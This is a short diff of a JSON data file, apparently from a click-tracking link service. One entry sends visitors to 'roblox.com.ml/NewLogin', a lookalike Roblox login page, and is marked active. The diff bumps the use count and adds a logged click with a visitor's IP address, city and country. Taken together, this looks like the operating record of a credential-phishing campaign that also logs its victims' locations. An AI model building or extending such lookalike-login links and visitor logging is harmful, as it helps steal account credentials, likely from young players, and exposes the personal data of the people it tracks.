@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 94,
+    "useCount": 95,
     "createdBy": "admin",
     "clicks": [
       {
@@ -864,6 +864,14 @@
         "city": "Nitra",
         "flag": "🇸🇰",
         "countryCode": "SK"
+      },
+      {
+        "timestamp": 1776921372020,
+        "ip": "185.251.200.102",
+        "country": "Austria",
+        "city": "Feldkirch",
+        "flag": "🇦🇹",
+        "countryCode": "AT"
       }
     ]
   },
